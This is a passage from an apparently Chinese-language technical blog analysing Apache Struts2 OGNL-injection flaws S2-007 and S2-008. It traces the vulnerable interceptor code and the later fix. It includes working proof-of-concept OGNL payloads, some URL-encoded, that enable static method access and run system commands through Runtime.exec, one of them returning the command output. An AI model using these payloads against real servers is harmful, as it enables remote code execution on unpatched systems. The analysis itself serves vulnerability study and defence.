</span></span></code></pre></td></tr></table></div></div><p>现在理一下思路，也就是：</p><ul><li>通过Ognl表达式访问OgnlContext的 <code>SecurityMemberAccess</code> ;</li><li>通过调用 <code>SecurityMemberAccess</code> 的 <code>setAllowStaticMethodAccess(boolean)</code> 方法，设置允许调用静态方法；</li><li>当然，和S2-003一样，需要设置 <code>xwork.MethodAccessor.denyMethodExecution</code> 设置为false，否则不能执行方法；</li><li>使用Ognl表达式执行 <code>Runtime.getRuntime().exec(String)</code> 方法来执行命令；</li></ul><p>使用Ognl表达式设置前的OgnlContext：</p><p><img src=/media/image-20210816101440032.png alt=image-20210816101440032></p><p>使用Ognl表达式设置后的OgnlContext如下：</p><p><img src=/media/image-20210816101605399.png alt=image-20210816101605399></p><p>然后就可以顺利的执行 <code>Runtime.getRuntime().exec(String)</code> 了：</p><p><img src=/media/image-20210816101825104.png alt=image-20210816101825104></p><h2 id=s2-007>S2-007</h2><p>影响版本：Struts 2.0.0 - Struts 2.2.3</p><p>CVE编号：none</p><p>POC如下：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=err>&#39;</span> <span class=o>+</span> <span class=o>(</span><span class=err>#</span><span class=n>_memberAccess</span><span class=o>[</span><span class=s>&#34;allowStaticMethodAccess&#34;</span><span class=o>]=</span><span class=kc>true</span><span class=o>,</span><span class=err>#</span><span class=n>foo</span><span class=o>=</span><span class=k>new</span> <span class=n>java</span><span class=o>.</span><span class=na>lang</span><span class=o>.</span><span class=na>Boolean</span><span class=o>(</span><span class=s>&#34;false&#34;</span><span class=o>)</span> <span class=o>,</span><span class=err>#</span><span class=n>context</span><span class=o>[</span><span class=s>&#34;xwork.MethodAccessor.denyMethodExecution&#34;</span><span class=o>]=</span><span class=err>#</span><span class=n>foo</span><span class=o>,</span><span class=nd>@java.lang.Runtime@getRuntime</span><span class=o>().</span><span class=na>exec</span><span class=o>(</span><span class=s>&#34;calc&#34;</span><span class=o>))</span> <span class=o>+</span> <span class=err>&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// 带回显：
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=err>&#39;</span> <span class=o>+</span> <span class=o>(</span><span class=err>#</span><span class=n>_memberAccess</span><span class=o>[</span><span class=s>&#34;allowStaticMethodAccess&#34;</span><span class=o>]=</span><span class=kc>true</span><span class=o>,</span><span class=err>#</span><span class=n>foo</span><span class=o>=</span><span class=k>new</span> <span class=n>java</span><span class=o>.</span><span class=na>lang</span><span class=o>.</span><span class=na>Boolean</span><span class=o>(</span><span class=s>&#34;false&#34;</span><span class=o>)</span> <span class=o>,</span><span class=err>#</span><span class=n>context</span><span class=o>[</span><span class=s>&#34;xwork.MethodAccessor.denyMethodExecution&#34;</span><span class=o>]=</span><span class=err>#</span><span class=n>foo</span><span class=o>,</span><span class=nd>@org.apache.commons.io.IOUtils@toString</span><span class=o>(</span><span class=nd>@java.lang.Runtime@getRuntime</span><span class=o>().</span><span class=na>exec</span><span class=o>(</span><span class=err>&#39;</span><span class=n>whoami</span><span class=err>&#39;</span><span class=o>).</span><span class=na>getInputStream</span><span class=o>()))</span> <span class=o>+</span> <span class=err>&#39;</span>
</span></span></code></pre></td></tr></table></div></div><p>当配置了验证规则 <code>&lt;ActionName>-validation.xml</code> 时，若类型验证转换出错，后端默认会将用户提交的表单值通过字符串拼接，然后执行一次 OGNL 表达式解析，从而造成远程代码执行。</p><p>例如这里配置一个 <code>UserAction-validation.xml</code> 检查UserAction的age字段是否符合要求：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-xml data-lang=xml><span class=line><span class=cl><span class=cp>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34; ?&gt;</span>
</span></span><span class=line><span class=cl><span class=cp>&lt;!DOCTYPE validators PUBLIC
</span></span></span><span class=line><span class=cl><span class=cp>   &#34;-//OpenSymphony Group//XWork Validator 1.0//EN&#34;
</span></span></span><span class=line><span class=cl><span class=cp>   &#34;http://www.opensymphony.com/xwork/xwork-validator-1.0.2.dtd&#34;&gt;</span>
</span></span><span class=line><span class=cl><span class=nt>&lt;validators&gt;</span>
</span></span><span class=line><span class=cl>   <span class=nt>&lt;field</span> <span class=na>name=</span><span class=s>&#34;age&#34;</span><span class=nt>&gt;</span>
</span></span><span class=line><span class=cl>      <span class=nt>&lt;field-validator</span> <span class=na>type=</span><span class=s>&#34;int&#34;</span><span class=nt>&gt;</span>
</span></span><span class=line><span class=cl>         <span class=nt>&lt;param</span> <span class=na>name=</span><span class=s>&#34;min&#34;</span><span class=nt>&gt;</span>1<span class=nt>&lt;/param&gt;</span>
</span></span><span class=line><span class=cl>         <span class=nt>&lt;param</span> <span class=na>name=</span><span class=s>&#34;max&#34;</span><span class=nt>&gt;</span>150<span class=nt>&lt;/param&gt;</span>
</span></span><span class=line><span class=cl>      <span class=nt>&lt;/field-validator&gt;</span>
</span></span><span class=line><span class=cl>   <span class=nt>&lt;/field&gt;</span>
</span></span><span class=line><span class=cl><span class=nt>&lt;/validators&gt;</span>
</span></span></code></pre></td></tr></table></div></div><p>当我们传入的age字符验证失败时，会经过 <code>ConversionErrorInterceptor</code> 拦截器的处理：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=c1>// com.opensymphony.xwork2.interceptor.ConversionErrorInterceptor#intercept(ActionInvocation)
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=kd>public</span> <span class=n>String</span> <span class=nf>intercept</span><span class=o>(</span><span class=n>ActionInvocation</span> <span class=n>invocation</span><span class=o>)</span> <span class=kd>throws</span> <span class=n>Exception</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>ActionContext</span> <span class=n>invocationContext</span> <span class=o>=</span> <span class=n>invocation</span><span class=o>.</span><span class=na>getInvocationContext</span><span class=o>();</span>
</span></span><span class=line><span class=cl>    <span class=n>Map</span><span class=o>&lt;</span><span class=n>String</span><span class=o>,</span> <span class=n>Object</span><span class=o>&gt;</span> <span class=n>conversionErrors</span> <span class=o>=</span> <span class=n>invocationContext</span><span class=o>.</span><span class=na>getConversionErrors</span><span class=o>();</span>
</span></span><span class=line><span class=cl>    <span class=n>ValueStack</span> <span class=n>stack</span> <span class=o>=</span> <span class=n>invocationContext</span><span class=o>.</span><span class=na>getValueStack</span><span class=o>();</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>HashMap</span><span class=o>&lt;</span><span class=n>Object</span><span class=o>,</span> <span class=n>Object</span><span class=o>&gt;</span> <span class=n>fakie</span> <span class=o>=</span> <span class=kc>null</span><span class=o>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=o>(</span><span class=n>Map</span><span class=o>.</span><span class=na>Entry</span><span class=o>&lt;</span><span class=n>String</span><span class=o>,</span> <span class=n>Object</span><span class=o>&gt;</span> <span class=n>entry</span> <span class=o>:</span> <span class=n>conversionErrors</span><span class=o>.</span><span class=na>entrySet</span><span class=o>())</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=n>String</span> <span class=n>propertyName</span> <span class=o>=</span> <span class=n>entry</span><span class=o>.</span><span class=na>getKey</span><span class=o>();</span>
</span></span><span class=line><span class=cl>        <span class=n>Object</span> <span class=n>value</span> <span class=o>=</span> <span class=n>entry</span><span class=o>.</span><span class=na>getValue</span><span class=o>();</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=o>(</span><span class=n>shouldAddError</span><span class=o>(</span><span class=n>propertyName</span><span class=o>,</span> <span class=n>value</span><span class=o>))</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>            <span class=n>String</span> <span class=n>message</span> <span class=o>=</span> <span class=n>XWorkConverter</span><span class=o>.</span><span class=na>getConversionErrorMessage</span><span class=o>(</span><span class=n>propertyName</span><span class=o>,</span> <span class=n>stack</span><span class=o>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=n>Object</span> <span class=n>action</span> <span class=o>=</span> <span class=n>invocation</span><span class=o>.</span><span class=na>getAction</span><span class=o>();</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=o>(</span><span class=n>action</span> <span class=k>instanceof</span> <span class=n>ValidationAware</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>                <span class=n>ValidationAware</span> <span class=n>va</span> <span class=o>=</span> <span class=o>(</span><span class=n>ValidationAware</span><span class=o>)</span> <span class=n>action</span><span class=o>;</span>
</span></span><span class=line><span class=cl>                <span class=n>va</span><span class=o>.</span><span class=na>addFieldError</span><span class=o>(</span><span class=n>propertyName</span><span class=o>,</span> <span class=n>message</span><span class=o>);</span>
</span></span><span class=line><span class=cl>            <span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=o>(</span><span class=n>fakie</span> <span class=o>==</span> <span class=kc>null</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>                <span class=n>fakie</span> <span class=o>=</span> <span class=k>new</span> <span class=n>HashMap</span><span class=o>&lt;</span><span class=n>Object</span><span class=o>,</span> <span class=n>Object</span><span class=o>&gt;();</span>
</span></span><span class=line><span class=cl>            <span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=n>fakie</span><span class=o>.</span><span class=na>put</span><span class=o>(</span><span class=n>propertyName</span><span class=o>,</span> <span class=n>getOverrideExpr</span><span class=o>(</span><span class=n>invocation</span><span class=o>,</span> <span class=n>value</span><span class=o>));</span>
</span></span><span class=line><span class=cl>        <span class=o>}</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=o>(</span><span class=n>fakie</span> <span class=o>!=</span> <span class=kc>null</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=c1>// if there were some errors, put the original (fake) values in place right before the result
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=n>stack</span><span class=o>.</span><span class=na>getContext</span><span class=o>().</span><span class=na>put</span><span class=o>(</span><span class=n>ORIGINAL_PROPERTY_OVERRIDE</span><span class=o>,</span> <span class=n>fakie</span><span class=o>);</span>
</span></span><span class=line><span class=cl>        <span class=n>invocation</span><span class=o>.</span><span class=na>addPreResultListener</span><span class=o>(</span><span class=k>new</span> <span class=n>PreResultListener</span><span class=o>()</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>            <span class=kd>public</span> <span class=kt>void</span> <span class=nf>beforeResult</span><span class=o>(</span><span class=n>ActionInvocation</span> <span class=n>invocation</span><span class=o>,</span> <span class=n>String</span> <span class=n>resultCode</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>                <span class=n>Map</span><span class=o>&lt;</span><span class=n>Object</span><span class=o>,</span> <span class=n>Object</span><span class=o>&gt;</span> <span class=n>fakie</span> <span class=o>=</span> <span class=o>(</span><span class=n>Map</span><span class=o>&lt;</span><span class=n>Object</span><span class=o>,</span> <span class=n>Object</span><span class=o>&gt;)</span> <span class=n>invocation</span><span class=o>.</span><span class=na>getInvocationContext</span><span class=o>().</span><span class=na>get</span><span class=o>(</span><span class=n>ORIGINAL_PROPERTY_OVERRIDE</span><span class=o>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=o>(</span><span class=n>fakie</span> <span class=o>!=</span> <span class=kc>null</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>                    <span class=n>invocation</span><span class=o>.</span><span class=na>getStack</span><span class=o>().</span><span class=na>setExprOverrides</span><span class=o>(</span><span class=n>fakie</span><span class=o>);</span>
</span></span><span class=line><span class=cl>                <span class=o>}</span>
</span></span><span class=line><span class=cl>            <span class=o>}</span>
</span></span><span class=line><span class=cl>        <span class=o>});</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>invocation</span><span class=o>.</span><span class=na>invoke</span><span class=o>();</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span></code></pre></td></tr></table></div></div><p>这个拦截的处理很简单：</p><ul><li>首先通过 <code>Object value = entry.getValue();</code> 获取到用户输入错误的参数值；</li><li>通过 <code>fakie.put(propertyName, getOverrideExpr(invocation, value));</code> 将错误的参数值放入到 <code>fakie</code> （HashMap结构）中；</li><li>最后通过 <code>invocation.getStack().setExprOverrides(fakie);</code> 将 <code>fakie</code> 设置到当前 <code>ActionInvocation</code> 的 <code>ValueStack</code> 的 <code>overrides</code> 属性中。</li></ul><p>注意这里 <code>getOverrideExpr(invocation, value)</code> 会进行字符串拼接：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kd>protected</span> <span class=n>Object</span> <span class=nf>getOverrideExpr</span><span class=o>(</span><span class=n>ActionInvocation</span> <span class=n>invocation</span><span class=o>,</span> <span class=n>Object</span> <span class=n>value</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=s>&#34;&#39;&#34;</span> <span class=o>+</span> <span class=n>value</span> <span class=o>+</span> <span class=s>&#34;&#39;&#34;</span><span class=o>;</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span></code></pre></td></tr></table></div></div><p>这也就是为啥POC前后会有一个 <code>+</code> 符号的原因，就是为了逃逸单引号；</p><p>设置完毕后，当前 <code>ActionInvocation</code> 的 <code>ValueStack</code> 的 <code>overrides</code> 属性如下：</p><p><img src=/media/image-20210816110559248.png alt=image-20210816110559248></p><p>最后仍旧是Struts2的自定义标签 <code>textfield</code> 的视图渲染触发的漏洞。入口仍旧是 <code>org.apache.struts2.views.jsp.ComponentTagSupport#doEndTag()</code> 方法。最终在 <code>com.opensymphony.xwork2.util.TextParseUtil#translateVariables</code> 中如下位置触发 <code>ValueStack#findValue()</code> ：</p><p><img src=/media/image-20210816111319968.png alt=image-20210816111319968></p><p>最终会触发 <code>OgnlValueStack#tryFindValue(String, Class)</code> 方法，看到这个方法的实现如下：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kd>private</span> <span class=n>Object</span> <span class=nf>tryFindValue</span><span class=o>(</span><span class=n>String</span> <span class=n>expr</span><span class=o>,</span> <span class=n>Class</span> <span class=n>asType</span><span class=o>)</span> <span class=kd>throws</span> <span class=n>OgnlException</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>    <span class=n>Object</span> <span class=n>value</span> <span class=o>=</span> <span class=kc>null</span><span class=o>;</span>
</span></span><span class=line><span class=cl>    <span class=k>try</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=n>expr</span> <span class=o>=</span> <span class=n>lookupForOverrides</span><span class=o>(</span><span class=n>expr</span><span class=o>);</span>
</span></span><span class=line><span class=cl>        <span class=n>value</span> <span class=o>=</span> <span class=n>getValue</span><span class=o>(</span><span class=n>expr</span><span class=o>,</span> <span class=n>asType</span><span class=o>);</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=o>(</span><span class=n>value</span> <span class=o>==</span> <span class=kc>null</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>            <span class=n>value</span> <span class=o>=</span> <span class=n>findInContext</span><span class=o>(</span><span class=n>expr</span><span class=o>);</span>
</span></span><span class=line><span class=cl>        <span class=o>}</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span> <span class=k>finally</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=n>context</span><span class=o>.</span><span class=na>remove</span><span class=o>(</span><span class=n>THROW_EXCEPTION_ON_FAILURE</span><span class=o>);</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>value</span><span class=o>;</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span></code></pre></td></tr></table></div></div><p>注意到这里会调用 <code>lookupForOverrides(expr);</code> 从当前OgnlValueStack中的 <code>overrides</code> 属性中查找age的值，这里因为前面在 <code>ConversionErrorInterceptor</code> 拦截器中以及设置了 <code>overrides</code> 属性，并且值就是恶意的Ognl表达式。所以这里经过 <code>lookupForOverrides(expr)</code> 处理后得到的expr就是我们恶意的Ognl表达式；</p><p>然后通过调用 <code>getValue(expr, asType)</code> 进行Ognl表达式解析，但是此时expr是一个恶意的表达式，从而造成RCE；</p><p>关于这个漏洞的修复，也是比较粗暴，直接在 <code>ConversionErrorInterceptor</code> 中修改 <code>getOverrideExpr(ActionInvocation, Object)</code> 方法，增加转义处理，此时就无法逃逸双引号了，也就无法造成Ognl表达式注入了：</p><p><img src=/media/image-20210816112427178.png alt=image-20210816112427178></p><h2 id=s2-008>S2-008</h2><p>影响版本：Struts 2.0.0 - Struts 2.3.17</p><p>CVE编号：none</p><p>POC如下：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=c1>// 需要开启devmode，但是Struts2默认关闭
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>?</span><span class=n>debug</span><span class=o>=</span><span class=n>command</span><span class=o>&amp;</span><span class=n>expression</span><span class=o>=(%</span><span class=n>23_memberAccess</span><span class=o>%</span><span class=n>5B</span><span class=o>%</span><span class=n>22allowStaticMethodAccess</span><span class=o>%</span><span class=n>22</span><span class=o>%</span><span class=n>5D</span><span class=o>%</span><span class=n>3Dtrue</span><span class=o>%</span><span class=n>2C</span><span class=o>%</span><span class=n>23foo</span><span class=o>%</span><span class=n>3Dnew</span><span class=o>%</span><span class=n>20java</span><span class=o>.</span><span class=na>lang</span><span class=o>.</span><span class=na>Boolean</span><span class=o>%</span><span class=n>28</span><span class=o>%</span><span class=n>22false</span><span class=o>%</span><span class=n>22</span><span class=o>%</span><span class=n>29</span><span class=o>%</span><span class=n>20</span><span class=o>%</span><span class=n>2C</span><span class=o>%</span><span class=n>23context</span><span class=o>%</span><span class=n>5B</span><span class=o>%</span><span class=n>22xwork</span><span class=o>.</span><span class=na>MethodAccessor</span><span class=o>.</span><span class=na>denyMethodExecution</span><span class=o>%</span><span class=n>22</span><span class=o>%</span><span class=n>5D</span><span class=o>%</span><span class=n>3D</span><span class=o>%</span><span class=n>23foo</span><span class=o>%</span><span class=n>2C</span><span class=nd>@java.lang.Runtime@getRuntime</span><span class=o>%</span><span class=n>28</span><span class=o>%</span><span class=n>29</span><span class=o>.</span><span class=na>exec</span><span class=o>%</span><span class=n>28</span><span class=o>%</span><span class=n>22calc</span><span class=o>%</span><span class=n>22</span><span class=o>%</span><span class=n>29</span><span class=o>)</span>
</span></span></code></pre></td></tr></table></div></div><p>这个漏洞很简单，如果开启debug模式，漏洞就发生在 <code>org.apache.struts2.interceptor.debugging.DebuggingInterceptor#intercept(ActionInvocation)</code> 中（当前，要经过这个拦截器首先得开启debug模式）。看到简化的代码：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl>    <span class=kd>public</span> <span class=n>String</span> <span class=nf>intercept</span><span class=o>(</span><span class=n>ActionInvocation</span> <span class=n>inv</span><span class=o>)</span> <span class=kd>throws</span> <span class=n>Exception</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=kt>boolean</span> <span class=n>actionOnly</span> <span class=o>=</span> <span class=kc>false</span><span class=o>;</span>
</span></span><span class=line><span class=cl>        <span class=kt>boolean</span> <span class=n>cont</span> <span class=o>=</span> <span class=kc>true</span><span class=o>;</span>
</span></span><span class=line><span class=cl>        <span class=n>Boolean</span> <span class=n>devModeOverride</span> <span class=o>=</span> <span class=n>FilterDispatcher</span><span class=o>.</span><span class=na>getDevModeOverride</span><span class=o>();</span>
</span></span><span class=line><span class=cl>        <span class=kt>boolean</span> <span class=n>devMode</span> <span class=o>=</span> <span class=n>devModeOverride</span> <span class=o>!=</span> <span class=kc>null</span> <span class=o>?</span> <span class=n>devModeOverride</span> <span class=o>:</span> <span class=k>this</span><span class=o>.</span><span class=na>devMode</span><span class=o>;</span>
</span></span><span class=line><span class=cl>        <span class=kd>final</span> <span class=n>ActionContext</span> <span class=n>ctx</span><span class=o>;</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=o>(</span><span class=n>devMode</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>            <span class=n>ctx</span> <span class=o>=</span> <span class=n>ActionContext</span><span class=o>.</span><span class=na>getContext</span><span class=o>();</span>
</span></span><span class=line><span class=cl>            <span class=n>String</span> <span class=n>type</span> <span class=o>=</span> <span class=k>this</span><span class=o>.</span><span class=na>getParameter</span><span class=o>(</span><span class=s>&#34;debug&#34;</span><span class=o>);</span>
</span></span><span class=line><span class=cl>            <span class=n>ctx</span><span class=o>.</span><span class=na>getParameters</span><span class=o>().</span><span class=na>remove</span><span class=o>(</span><span class=s>&#34;debug&#34;</span><span class=o>);</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=o>(</span><span class=s>&#34;xml&#34;</span><span class=o>.</span><span class=na>equals</span><span class=o>(</span><span class=n>type</span><span class=o>))</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>                <span class=c1>// ......
</span></span></span><span class=line><span class=cl><span class=c1></span>            <span class=o>}</span> <span class=k>else</span> <span class=k>if</span> <span class=o>(</span><span class=s>&#34;console&#34;</span><span class=o>.</span><span class=na>equals</span><span class=o>(</span><span class=n>type</span><span class=o>))</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>                <span class=c1>// ......
</span></span></span><span class=line><span class=cl><span class=c1></span>            <span class=o>}</span><span class=k>else</span> <span class=k>if</span> <span class=o>(</span><span class=s>&#34;command&#34;</span><span class=o>.</span><span class=na>equals</span><span class=o>(</span><span class=n>type</span><span class=o>))</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>                <span class=n>ValueStack</span> <span class=n>stack</span> <span class=o>=</span> <span class=o>(</span><span class=n>ValueStack</span><span class=o>)</span><span class=n>ctx</span><span class=o>.</span><span class=na>getSession</span><span class=o>().</span><span class=na>get</span><span class=o>(</span><span class=s>&#34;org.apache.struts2.interceptor.debugging.VALUE_STACK&#34;</span><span class=o>);</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=o>(</span><span class=n>stack</span> <span class=o>==</span> <span class=kc>null</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>                    <span class=n>stack</span> <span class=o>=</span> <span class=o>(</span><span class=n>ValueStack</span><span class=o>)</span><span class=n>ctx</span><span class=o>.</span><span class=na>get</span><span class=o>(</span><span class=s>&#34;com.opensymphony.xwork2.util.ValueStack.ValueStack&#34;</span><span class=o>);</span>
</span></span><span class=line><span class=cl>                    <span class=n>ctx</span><span class=o>.</span><span class=na>getSession</span><span class=o>().</span><span class=na>put</span><span class=o>(</span><span class=s>&#34;org.apache.struts2.interceptor.debugging.VALUE_STACK&#34;</span><span class=o>,</span> <span class=n>stack</span><span class=o>);</span>
</span></span><span class=line><span class=cl>                <span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=n>String</span> <span class=n>cmd</span> <span class=o>=</span> <span class=k>this</span><span class=o>.</span><span class=na>getParameter</span><span class=o>(</span><span class=s>&#34;expression&#34;</span><span class=o>);</span>
</span></span><span class=line><span class=cl>                <span class=n>ServletActionContext</span><span class=o>.</span><span class=na>getRequest</span><span class=o>().</span><span class=na>setAttribute</span><span class=o>(</span><span class=s>&#34;decorator&#34;</span><span class=o>,</span> <span class=s>&#34;none&#34;</span><span class=o>);</span>
</span></span><span class=line><span class=cl>                <span class=n>HttpServletResponse</span> <span class=n>res</span> <span class=o>=</span> <span class=n>ServletActionContext</span><span class=o>.</span><span class=na>getResponse</span><span class=o>();</span>
</span></span><span class=line><span class=cl>                <span class=n>res</span><span class=o>.</span><span class=na>setContentType</span><span class=o>(</span><span class=s>&#34;text/plain&#34;</span><span class=o>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=k>try</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>                    <span class=n>PrintWriter</span> <span class=n>writer</span> <span class=o>=</span> <span class=n>ServletActionContext</span><span class=o>.</span><span class=na>getResponse</span><span class=o>().</span><span class=na>getWriter</span><span class=o>();</span>
</span></span><span class=line><span class=cl>                    <span class=n>writer</span><span class=o>.</span><span class=na>print</span><span class=o>(</span><span class=n>stack</span><span class=o>.</span><span class=na>findValue</span><span class=o>(</span><span class=n>cmd</span><span class=o>));</span>
</span></span><span class=line><span class=cl>                    <span class=n>writer</span><span class=o>.</span><span class=na>close</span><span class=o>();</span>
</span></span><span class=line><span class=cl>                <span class=o>}</span> <span class=k>catch</span> <span class=o>(</span><span class=n>IOException</span> <span class=n>var17</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>                    <span class=n>var17</span><span class=o>.</span><span class=na>printStackTrace</span><span class=o>();</span>
</span></span><span class=line><span class=cl>                <span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=n>cont</span> <span class=o>=</span> <span class=kc>false</span><span class=o>;</span>
</span></span><span class=line><span class=cl>            <span class=o>}</span>
</span></span><span class=line><span class=cl>            <span class=c1>// ......
